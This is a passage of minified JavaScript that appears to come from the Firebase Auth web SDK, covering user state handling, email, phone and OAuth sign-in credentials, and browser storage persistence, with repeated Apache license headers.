this.currentUser.getIdToken();await this._updateCurrentUser(e,!0)}}async initializeCurrentUser(e){var t;let n=await this.assertedPersistence.getCurrentUser(),r=n,i=!1;if(e&&this.config.authDomain){await this.getOrInitRedirectPersistenceManager();let n=null===(t=this.redirectUser)||void 0===t?void 0:t._redirectEventId,s=null==r?void 0:r._redirectEventId,a=await this.tryRedirectSignIn(e);(!n||n===s)&&(null==a?void 0:a.user)&&(r=a.user,i=!0)}if(!r)return this.directlySetCurrentUser(null);if(!r._redirectEventId){if(i)try{await this.beforeStateQueue.runMiddleware(r)}catch(e){r=n,this._popupRedirectResolver._overrideRedirectResult(this,(()=>Promise.reject(e)))}return r?this.reloadAndSetCurrentUserOrClear(r):this.directlySetCurrentUser(null)}return g(this._popupRedirectResolver,this,"argument-error"),await this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===r._redirectEventId?this.directlySetCurrentUser(r):this.reloadAndSetCurrentUserOrClear(r)}async tryRedirectSignIn(e){let t=null;try{t=await this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch(e){await this._setRedirectUser(null)}return t}async reloadAndSetCurrentUserOrClear(e){try{await j(e)}catch(e){if("auth/network-request-failed"!==(null==e?void 0:e.code))return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)}useDeviceLanguage(){this.languageCode=function(){if("undefined"==typeof navigator)return null;let e=navigator;return e.languages&&e.languages[0]||e.language||null}()}async _delete(){this._deleted=!0}async updateCurrentUser(e){let t=e?(0,i.m9)(e):null;return t&&g(t.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(t&&t._clone(this))}async _updateCurrentUser(e,t=!1){if(!this._deleted)return e&&g(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),t||await this.beforeStateQueue.runMiddleware(e),this.queue((async()=>{await this.directlySetCurrentUser(e),this.notifyAuthListeners()}))}async signOut(){return await this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&await this._setRedirectUser(null),this._updateCurrentUser(null,!0)}setPersistence(e){return this.queue((async()=>{await this.assertedPersistence.setPersistence(w(e))}))}_getPersistence(){return this.assertedPersistence.persistence.type}_updateErrorMap(e){this._errorFactory=new i.LL("auth","Firebase",e())}onAuthStateChanged(e,t,n){return this.registerStateListener(this.authStateSubscription,e,t,n)}beforeAuthStateChanged(e,t){return this.beforeStateQueue.pushCallback(e,t)}onIdTokenChanged(e,t,n){return this.registerStateListener(this.idTokenSubscription,e,t,n)}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:null===(e=this._currentUser)||void 0===e?void 0:e.toJSON()}}async _setRedirectUser(e,t){let n=await this.getOrInitRedirectPersistenceManager(t);return null===e?n.removeCurrentUser():n.setCurrentUser(e)}async getOrInitRedirectPersistenceManager(e){if(!this.redirectPersistenceManager){let t=e&&w(e)||this._popupRedirectResolver;g(t,this,"argument-error"),this.redirectPersistenceManager=await H.create(this,[w(t._redirectPersistence)],"redirectUser"),this.redirectUser=await this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager}async _redirectUserForId(e){var t,n;return this._isInitialized&&await this.queue((async()=>{})),(null===(t=this._currentUser)||void 0===t?void 0:t._redirectEventId)===e?this._currentUser:(null===(n=this.redirectUser)||void 0===n?void 0:n._redirectEventId)===e?this.redirectUser:null}async _persistUserIfCurrent(e){if(e===this.currentUser)return this.queue((async()=>this.directlySetCurrentUser(e)))}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,t;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);let n=null!==(t=null===(e=this.currentUser)||void 0===e?void 0:e.uid)&&void 0!==t?t:null;this.lastNotifiedUid!==n&&(this.lastNotifiedUid=n,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,t,n,r){if(this._deleted)return()=>{};let i="function"==typeof t?t:t.next.bind(t),s=this._isInitialized?Promise.resolve():this._initializationPromise;return g(s,this,"internal-error"),s.then((()=>i(this.currentUser))),"function"==typeof t?e.addObserver(t,n,r):e.addObserver(t)}async directlySetCurrentUser(e){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?await this.assertedPersistence.setCurrentUser(e):await this.assertedPersistence.removeCurrentUser()}queue(e){return this.operations=this.operations.then(e,e),this.operations}get assertedPersistence(){return g(this.persistenceManager,this,"internal-error"),this.persistenceManager}_logFramework(e){!e||this.frameworks.includes(e)||(this.frameworks.push(e),this.frameworks.sort(),this.clientVersion=ie(this.config.clientPlatform,this._getFrameworks()))}_getFrameworks(){return this.frameworks}async _getAdditionalHeaders(){var e;let t={"X-Client-Version":this.clientVersion};this.app.options.appId&&(t["X-Firebase-gmpid"]=this.app.options.appId);let n=await(null===(e=this.heartbeatServiceProvider.getImmediate({optional:!0}))||void 0===e?void 0:e.getHeartbeatsHeader());return n&&(t["X-Firebase-Client"]=n),t}}function oe(e){return(0,i.m9)(e)}class le{constructor(e){this.auth=e,this.observer=null,this.addObserver=(0,i.ne)((e=>this.observer=e))}get next(){return g(this.observer,this.auth,"internal-error"),this.observer.next.bind(this.observer)}}function ue(e){let t=e.indexOf(":");return t<0?"":e.substr(0,t+1)}function ce(e){if(!e)return null;let t=Number(e);return isNaN(t)?null:t}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class he{constructor(e,t){this.providerId=e,this.signInMethod=t}toJSON(){return y("not implemented")}_getIdTokenResponse(e){return y("not implemented")}_linkToIdToken(e,t){return y("not implemented")}_getReauthenticationResolver(e){return y("not implemented")}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class de extends he{constructor(e,t,n,r=null){super("password",n),this._email=e,this._password=t,this._tenantId=r}static _fromEmailAndPassword(e,t){return new de(e,t,"password")}static _fromEmailAndCode(e,t,n=null){return new de(e,t,"emailLink",n)}toJSON(){return{email:this._email,password:this._password,signInMethod:this.signInMethod,tenantId:this._tenantId}}static fromJSON(e){let t="string"==typeof e?JSON.parse(e):e;if((null==t?void 0:t.email)&&(null==t?void 0:t.password)){if("password"===t.signInMethod)return this._fromEmailAndPassword(t.email,t.password);if("emailLink"===t.signInMethod)return this._fromEmailAndCode(t.email,t.password,t.tenantId)}return null}async _getIdTokenResponse(e){switch(this.signInMethod){case"password":
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */return async function(e,t){return O(e,"POST","/v1/accounts:signInWithPassword",A(e,t))}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */(e,{returnSecureToken:!0,email:this._email,password:this._password});case"emailLink":return async function(e,t){return O(e,"POST","/v1/accounts:signInWithEmailLink",A(e,t))}(e,{email:this._email,oobCode:this._password});default:d(e,"internal-error")}}async _linkToIdToken(e,t){switch(this.signInMethod){case"password":return async function(e,t){return C(e,"POST","/v1/accounts:update",t)}(e,{idToken:t,returnSecureToken:!0,email:this._email,password:this._password});case"emailLink":return async function(e,t){return O(e,"POST","/v1/accounts:signInWithEmailLink",A(e,t))}(e,{idToken:t,email:this._email,oobCode:this._password});default:d(e,"internal-error")}}_getReauthenticationResolver(e){return this._getIdTokenResponse(e)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function fe(e,t){return O(e,"POST","/v1/accounts:signInWithIdp",A(e,t))}class pe extends he{constructor(){super(...arguments),this.pendingToken=null}static _fromParams(e){let t=new pe(e.providerId,e.signInMethod);return e.idToken||e.accessToken?(e.idToken&&(t.idToken=e.idToken),e.accessToken&&(t.accessToken=e.accessToken),e.nonce&&!e.pendingToken&&(t.nonce=e.nonce),e.pendingToken&&(t.pendingToken=e.pendingToken)):e.oauthToken&&e.oauthTokenSecret?(t.accessToken=e.oauthToken,t.secret=e.oauthTokenSecret):d("argument-error"),t}toJSON(){return{idToken:this.idToken,accessToken:this.accessToken,secret:this.secret,nonce:this.nonce,pendingToken:this.pendingToken,providerId:this.providerId,signInMethod:this.signInMethod}}static fromJSON(e){let t="string"==typeof e?JSON.parse(e):e,{providerId:n,signInMethod:r}=t,i=(0,o._T)(t,["providerId","signInMethod"]);if(!n||!r)return null;let s=new pe(n,r);return s.idToken=i.idToken||void 0,s.accessToken=i.accessToken||void 0,s.secret=i.secret,s.nonce=i.nonce,s.pendingToken=i.pendingToken||null,s}_getIdTokenResponse(e){return fe(e,this.buildRequest())}_linkToIdToken(e,t){let n=this.buildRequest();return n.idToken=t,fe(e,n)}_getReauthenticationResolver(e){let t=this.buildRequest();return t.autoCreate=!1,fe(e,t)}buildRequest(){let e={requestUri:"http://localhost",returnSecureToken:!0};if(this.pendingToken)e.pendingToken=this.pendingToken;else{let t={};this.idToken&&(t.id_token=this.idToken),this.accessToken&&(t.access_token=this.accessToken),this.secret&&(t.oauth_token_secret=this.secret),t.providerId=this.providerId,this.nonce&&!this.pendingToken&&(t.nonce=this.nonce),e.postBody=(0,i.xO)(t)}return e}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let me={USER_NOT_FOUND:"user-not-found"};
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class ge extends he{constructor(e){super("phone","phone"),this.params=e}static _fromVerification(e,t){return new ge({verificationId:e,verificationCode:t})}static _fromTokenResponse(e,t){return new ge({phoneNumber:e,temporaryProof:t})}_getIdTokenResponse(e){return async function(e,t){return O(e,"POST","/v1/accounts:signInWithPhoneNumber",A(e,t))}(e,this._makeVerificationRequest())}_linkToIdToken(e,t){return async function(e,t){let n=await O(e,"POST","/v1/accounts:signInWithPhoneNumber",A(e,t));if(n.temporaryProof)throw x(e,"account-exists-with-different-credential",n);return n}(e,Object.assign({idToken:t},this._makeVerificationRequest()))}_getReauthenticationResolver(e){return async function(e,t){return O(e,"POST","/v1/accounts:signInWithPhoneNumber",A(e,Object.assign(Object.assign({},t),{operation:"REAUTH"})),me)}(e,this._makeVerificationRequest())}_makeVerificationRequest(){let{temporaryProof:e,phoneNumber:t,verificationId:n,verificationCode:r}=this.params;return e&&t?{temporaryProof:e,phoneNumber:t}:{sessionInfo:n,code:r}}toJSON(){let e={providerId:this.providerId};return this.params.phoneNumber&&(e.phoneNumber=this.params.phoneNumber),this.params.temporaryProof&&(e.temporaryProof=this.params.temporaryProof),this.params.verificationCode&&(e.verificationCode=this.params.verificationCode),this.params.verificationId&&(e.verificationId=this.params.verificationId),e}static fromJSON(e){"string"==typeof e&&(e=JSON.parse(e));let{verificationId:t,verificationCode:n,phoneNumber:r,temporaryProof:i}=e;return n||t||r||i?new ge({verificationId:t,verificationCode:n,phoneNumber:r,temporaryProof:i}):null}}class ye{constructor(e){var t,n,r,s,a,o;let l=(0,i.zd)((0,i.pd)(e)),u=null!==(t=l.apiKey)&&void 0!==t?t:null,c=null!==(n=l.oobCode)&&void 0!==n?n:null,h=
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function(e){switch(e){case"recoverEmail":return"RECOVER_EMAIL";case"resetPassword":return"PASSWORD_RESET";case"signIn":return"EMAIL_SIGNIN";case"verifyEmail":return"VERIFY_EMAIL";case"verifyAndChangeEmail":return"VERIFY_AND_CHANGE_EMAIL";case"revertSecondFactorAddition":return"REVERT_SECOND_FACTOR_ADDITION";default:return null}}(null!==(r=l.mode)&&void 0!==r?r:null);g(u&&c&&h,"argument-error"),this.apiKey=u,this.operation=h,this.code=c,this.continueUrl=null!==(s=l.continueUrl)&&void 0!==s?s:null,this.languageCode=null!==(a=l.languageCode)&&void 0!==a?a:null,this.tenantId=null!==(o=l.tenantId)&&void 0!==o?o:null}static parseLink(e){let t=function(e){let t=(0,i.zd)((0,i.pd)(e)).link,n=t?(0,i.zd)((0,i.pd)(t)).deep_link_id:null,r=(0,i.zd)((0,i.pd)(e)).deep_link_id;return(r?(0,i.zd)((0,i.pd)(r)).link:null)||r||n||t||e}(e);try{return new ye(t)}catch(e){return null}}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ve{constructor(){this.providerId=ve.PROVIDER_ID}static credential(e,t){return de._fromEmailAndPassword(e,t)}static credentialWithLink(e,t){let n=ye.parseLink(t);return g(n,"argument-error"),de._fromEmailAndCode(e,n.code,n.tenantId)}}ve.PROVIDER_ID="password",ve.EMAIL_PASSWORD_SIGN_IN_METHOD="password",ve.EMAIL_LINK_SIGN_IN_METHOD="emailLink";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class we{constructor(e){this.providerId=e,this.defaultLanguageCode=null,this.customParameters={}}setDefaultLanguage(e){this.defaultLanguageCode=e}setCustomParameters(e){return this.customParameters=e,this}getCustomParameters(){return this.customParameters}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class be extends we{constructor(){super(...arguments),this.scopes=[]}addScope(e){return this.scopes.includes(e)||this.scopes.push(e),this}getScopes(){return[...this.scopes]}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _e extends be{constructor(){super("facebook.com")}static credential(e){return pe._fromParams({providerId:_e.PROVIDER_ID,signInMethod:_e.FACEBOOK_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return _e.credentialFromTaggedObject(e)}static credentialFromError(e){return _e.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return _e.credential(e.oauthAccessToken)}catch(e){return null}}}_e.FACEBOOK_SIGN_IN_METHOD="facebook.com",_e.PROVIDER_ID="facebook.com";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Ie extends be{constructor(){super("google.com"),this.addScope("profile")}static credential(e,t){return pe._fromParams({providerId:Ie.PROVIDER_ID,signInMethod:Ie.GOOGLE_SIGN_IN_METHOD,idToken:e,accessToken:t})}static credentialFromResult(e){return Ie.credentialFromTaggedObject(e)}static credentialFromError(e){return Ie.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;let{oauthIdToken:t,oauthAccessToken:n}=e;if(!t&&!n)return null;try{return Ie.credential(t,n)}catch(e){return null}}}Ie.GOOGLE_SIGN_IN_METHOD="google.com",Ie.PROVIDER_ID="google.com";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Ee extends be{constructor(){super("github.com")}static credential(e){return pe._fromParams({providerId:Ee.PROVIDER_ID,signInMethod:Ee.GITHUB_SIGN_IN_METHOD,accessToken:e})}static credentialFromResult(e){return Ee.credentialFromTaggedObject(e)}static credentialFromError(e){return Ee.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e||!("oauthAccessToken"in e)||!e.oauthAccessToken)return null;try{return Ee.credential(e.oauthAccessToken)}catch(e){return null}}}Ee.GITHUB_SIGN_IN_METHOD="github.com",Ee.PROVIDER_ID="github.com";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Te extends be{constructor(){super("twitter.com")}static credential(e,t){return pe._fromParams({providerId:Te.PROVIDER_ID,signInMethod:Te.TWITTER_SIGN_IN_METHOD,oauthToken:e,oauthTokenSecret:t})}static credentialFromResult(e){return Te.credentialFromTaggedObject(e)}static credentialFromError(e){return Te.credentialFromTaggedObject(e.customData||{})}static credentialFromTaggedObject({_tokenResponse:e}){if(!e)return null;let{oauthAccessToken:t,oauthTokenSecret:n}=e;if(!t||!n)return null;try{return Te.credential(t,n)}catch(e){return null}}}Te.TWITTER_SIGN_IN_METHOD="twitter.com",Te.PROVIDER_ID="twitter.com";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Se{constructor(e){this.user=e.user,this.providerId=e.providerId,this._tokenResponse=e._tokenResponse,this.operationType=e.operationType}static async _fromIdTokenResponse(e,t,n,r=!1){let i=await z._fromIdTokenResponse(e,n,r),s=ke(n);return new Se({user:i,providerId:s,_tokenResponse:n,operationType:t})}static async _forOperation(e,t,n){await e._updateTokensIfNecessary(n,!0);let r=ke(n);return new Se({user:e,providerId:r,_tokenResponse:n,operationType:t})}}function ke(e){return e.providerId?e.providerId:"phoneNumber"in e?"phone":null}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ae extends i.ZR{constructor(e,t,n,r){var i;super(t.code,t.message),this.operationType=n,this.user=r,Object.setPrototypeOf(this,Ae.prototype),this.customData={appName:e.name,tenantId:null!==(i=e.tenantId)&&void 0!==i?i:void 0,_serverResponse:t.customData._serverResponse,operationType:n}}static _fromErrorAndOperation(e,t,n,r){return new Ae(e,t,n,r)}}function Ce(e,t,n,r){return("reauthenticate"===t?n._getReauthenticationResolver(e):n._getIdTokenResponse(e)).catch((n=>{if("auth/multi-factor-auth-required"===n.code)throw Ae._fromErrorAndOperation(e,n,t,r);throw n}))}function Ne(e,t,n,r){return(0,i.m9)(e).onAuthStateChanged(t,n,r)}new WeakMap;let Oe="__sak";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class De{constructor(e,t){this.storageRetriever=e,this.type=t}_isAvailable(){try{return this.storage?(this.storage.setItem(Oe,"1"),this.storage.removeItem(Oe),Promise.resolve(!0)):Promise.resolve(!1)}catch(e){return Promise.resolve(!1)}}_set(e,t){return this.storage.setItem(e,JSON.stringify(t)),Promise.resolve()}_get(e){let t=this.storage.getItem(e);return Promise.resolve(t?JSON.parse(t):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}class Re extends De{constructor(){super((()=>window.localStorage),"LOCAL"),this.boundEventHandler=(e,t)=>this.onStorageEvent(e,t),this.listeners={},this.localCache={},this.pollTimer=null,this.safariLocalStorageNotSynced=
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function(){let e=(0,i.z$)();return J(e)||ne(e)}()&&function(){try{return!(!window||window===window.top)}catch(e){return!1}}(),this.fallbackToPolling=re(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(let t of Object.keys(this.listeners)){let n=this.storage.getItem(t),r=this.localCache[t];n!==r&&e(t,r,n)}}onStorageEvent(e,t=!1){if(!e.key)return void this.forAllChangedKeys(((e,t,n)=>{this.notifyListeners(e,n)}));let n=e.key;if(t?this.detachListener():this.stopPolling(),this.safariLocalStorageNotSynced){let r=this.storage.getItem(n);if(e.newValue!==r)null!==e.newValue?this.storage.setItem(n,e.newValue):this.storage.removeItem(n);else if(this.localCache[n]===e.newValue&&!t)return}let r=()=>{let e=this.storage.getItem(n);(t||this.localCache[n]!==e)&&this.notifyListeners(n,e)},s=this.storage.getItem(n);(0,i.w1)()&&10===document.documentMode&&s!==e.newValue&&e.newValue!==e.oldValue?setTimeout(r,10):r()}notifyListeners(e,t){this.localCache[e]=t;let n=this.listeners[e];if(n)for(let e of Array.from(n))e(t?JSON.parse(t):t)}startPolling(){this.stopPolling(),this.pollTimer=setInterval((()=>{this.forAllChangedKeys(((e,t,n)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:t,newValue:n}),!0)}))}),1e3)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,t){0===Object.keys(this.listeners).length&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),0===this.listeners[e].size&&delete this.listeners[e]),0===Object.keys(this.listeners).length&&(this.detachListener(),this.stopPolling())}async _set(e,t){await super._set(e,t),this.localCache[e]=JSON.stringify(t)}async _get(e){let t=await super._get(e);return this.localCache[e]=JSON.stringify(t),t}async _remove(e){await super._remove(e),delete this.localCache[e]}}Re.type="LOCAL";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class xe extends De{constructor(){super((()=>window.sessionStorage),"SESSION")}_addListener(e,t){}_removeListener(e,t){}}xe.type="SESSION";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
